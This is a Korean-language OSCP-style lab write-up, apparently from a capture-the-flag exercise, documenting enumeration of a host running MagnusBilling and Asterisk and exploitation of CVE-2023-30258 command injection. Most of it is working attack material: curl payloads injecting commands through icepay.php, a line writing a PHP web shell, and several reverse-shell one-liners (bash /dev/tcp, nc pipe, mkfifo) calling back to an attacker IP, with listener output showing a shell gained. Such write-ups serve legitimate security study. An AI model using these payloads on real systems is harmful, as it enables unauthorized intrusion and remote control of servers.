# OSCP 침투 테스트 이뉴머레이션 정리

hint: https://github.com/MarkLee131/awesome-web-pocs/blob/main/CVE-2023-30258.md

## 🎯 타겟 시스템 정보
- **IP**: 10.10.86.223
- **OS**: Linux (Debian 기반)

## 📡 1단계: 초기 포트 스캔 및 서비스 발견

### Nmap 스캔 결과
```bash
nmap -Pn -sC -sV -oN scan.txt -p- 10.10.86.223
```

**발견된 서비스:**
| 포트 | 서비스 | 버전 | 상태 |
|------|--------|------|------|
| 22   | SSH    | OpenSSH 9.2p1 Debian | 열림 |
| 80   | HTTP   | Apache 2.4.62 | 열림 |
| 3306 | MySQL  | MariaDB | 열림 (인증 필요) |
| 5038 | Asterisk | Call Manager 2.10.6 | 열림 |

**핵심 발견사항:**
- `/mbilling/` 디렉토리가 robots.txt에서 발견됨
- HTTP 서비스가 자동으로 `/mbilling/`로 리다이렉트됨

## 🔍 2단계: 서비스별 이뉴머레이션

### A. HTTP 서비스 (포트 80) - MagnusBilling 발견
```bash
# 웹 서버 확인
curl -s http://10.10.86.223/mbilling/ | grep -i version
```

**발견된 애플리케이션**: MagnusBilling (VoIP 빌링 시스템)

### B. Asterisk Call Manager (포트 5038)
```bash
# Asterisk 서비스 연결 테스트
nc -nv 10.10.86.223 5038
```

**연결 결과:**
- Asterisk Call Manager/2.10.6 실행 중
- 기본 크리덴셜 시도: admin/admin → 인증 실패

**사용한 netcat 옵션:**
- `-n`: DNS 조회 비활성화 (속도 향상)
- `-v`: verbose 모드 (연결 상태 출력)

## 🔎 3단계: 취약점 조사

### Asterisk 취약점 검색
```bash
searchsploit Asterisk
```
**결과**: 다수의 DoS 취약점 발견되었으나 원격 코드 실행 취약점은 제한적

### MagnusBilling 취약점 검색
```bash
searchsploit magnus
```
**🚨 중요 발견**: CVE-2023-30258 - Command Injection 취약점
- **파일**: `/usr/share/exploitdb/exploits/multiple/webapps/52170.txt`
- **영향 버전**: MagnusBilling 7.3.0
- **취약점 유형**: 명령어 주입 (Command Injection)

## 💥 4단계: 발견된 취약점 분석

### CVE-2023-30258 상세 정보
**취약한 엔드포인트:**
```
/lib/icepay/icepay.php?democ=<payload>
```

**PoC (Proof of Concept):**
```bash
# 기본 명령어 주입 테스트
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=zzz.php;"
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=zzz.php%3Becho%20%27<?php%20system(%24_GET%5B%22cmd%22%5D);%20?>%27%20%3E%20zzz.php"

# %3B는 세미콜론(;)의 URL 인코딩
# 세미콜론으로 명령어를 체인화하여 추가 명령 실행 가능
```

## 🚫 현재 직면한 문제들

1. **연결 문제**: 일부 curl/gobuster 명령에서 연결 거부 발생
   - 방화벽 또는 서비스 다운타임 가능성

2. **디렉토리 이뉴머레이션 실패**: gobuster 실행 중 연결 오류

## 🎯 다음 단계 액션 플랜

#### 1. 연결 상태 재확인
```bash
# 포트 상태 재확인
nmap -p 80,22,3306,5038 10.10.86.223
```

#### 2. 웹 서비스 접근성 테스트
```bash
# 웹 서버 응답 확인
curl -I http://10.10.86.223/
curl -I http://10.10.86.223/mbilling/

# robots.txt 내용 확인
curl http://10.10.86.223/robots.txt
```

#### 3. Command Injection 취약점 테스트
```bash
# 5초 지연되면 명령어가 실행된 것
time curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bsleep%205"
# 결과를 웹에서 접근 가능한 위치에 저장
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami%20%3E%20/var/www/html/mbilling/result.txt"

# 저장된 결과 확인
curl "http://10.10.86.223/mbilling/result.txt"

# 1단계: 기본 명령어 실행 테스트
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami"

# 2단계: 시스템 정보 수집
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bid"
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Buname%20-a"

# 3단계: 파일 시스템 탐색
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bls%20-la"
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bpwd"
```

#### 4. 리버스 쉘 시도
```bash
# 리스너 설정
nc -lvnp 4444
l: listen
v: verbose mode
n: numeric-only IP addresses
p: port number

# 리버스 쉘 시도
# %3B => ;    # 명령 구분
# %20 => 공백 # 스페이스
# %27 => '    # 작은따옴표
# %3E => >    # stdout
# %26 => &    # stderr 포함
# %2F => /    # 경로 구분
# %30 => 0    # stdin
# %31 => 1    # stdout
# %32 => 2    # stderr
# %3C => <    # stdin

# 디코딩
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i >& /dev/tcp/10.8.136.212/4444 0>&1'"
# 인코딩
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.8.136.212/4444%200%3E%261%27"
# bash 사용 시 ambiguous redirect 에러 발생 원인 파악중
┌──(root㉿docker-desktop)-[/]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.136.212] from (UNKNOWN) [10.10.86.223] 59270
bash: line 1: 1.txt: ambiguous redirect

# 리스너 먼저 시작
nc -lvnp 4444
# 단순
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i 2>&1 | nc 10.8.136.212 4444'"
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%202%3E%261%20%7C%20nc%2010.8.136.212%204444%27"
# 더 안정적인
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.136.212 4444 > /tmp/f"
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Brm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%2010.8.136.212%204444%20%3E/tmp/f"

# 리버스 쉘 시도 2차 -> 연결은 되나 에러
─(root㉿docker-desktop)-[/tmp]
└─# nc -lvvnp 4444
listening on [any] 4444 ...
connect to [10.8.136.212] from (UNKNOWN) [10.10.86.223] 38228
/bin/sh: 0: can't access tty; job control turned off
$ 


#### 5. 추가 이뉴머레이션
```bash
# 디렉토리 브루트포싱 재시도
gobuster dir -u http://10.10.86.223/mbilling/ -w /usr/share/wordlists/dirb/common.txt

# 설정 파일 접근 시도
curl http://10.10.86.223/mbilling/config/config.conf.php
curl http://10.10.86.223/mbilling/config/
```


#### MySQL 서비스 조사
```bash
# MySQL 연결 시도
apt instsall maria-client
mysql -h 10.10.86.223 -u root -p
mysql -h 10.10.86.223 -u admin -p
```


# 취약점 정보
cat /usr/share/exploitdb/exploits/multiple/webapps/52170.txt
# Exploit Title: MagnusSolution magnusbilling 7.3.0 - Command Injection
# Date: 2024-10-26
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/magnussolution/magnusbilling7
# Software Link: https://github.com/magnussolution/magnusbilling7
# Version: 7.3.0
# Tested on: Centos
# CVE : CVE-2023-30258


# PoC URL for Command Injection

http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt


curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami%20%3E%20/var/www/html/mbilling/real_test.txt"
curl "http://10.10.86.223/mbilling/real_test.txt"

nc -lvnp 4444  # 터미널 1
# 터미널 2에서:
curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.8.136.212/4444%200%3E%261%27"


## 커맨드 인젝션 -> 직접적인 인젝션을 해도 원격지에서 실행이 되므로 내가 확인은 불가능 -> 파일로 저장되게 한 후 -> http 로 접근해서 웹에서 확인하기

LHOST=10.8.136.212
LPORT=4444
TARGET='http://10.10.86.223/mbilling/lib/icepay/icepay.php'

payload=";id > /var/www/html/mbilling/lib/sangwoo"
encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
curl "${TARGET}?democ=test${encoded_payload}"

# 이후 결과 확인
http http://10.10.86.223/mbilling/lib/


┌──(root㉿docker-desktop)-[/]
└─# http http://10.10.86.223/mbilling/lib/sangwoo.txt
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Length: 60
Content-Type: text/plain
Date: Sun, 01 Jun 2025 11:57:24 GMT
ETag: "3c-6368156c3084c"
Keep-Alive: timeout=5, max=100
Last-Modified: Sun, 01 Jun 2025 11:56:34 GMT
Server: Apache/2.4.62 (Debian)

uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)


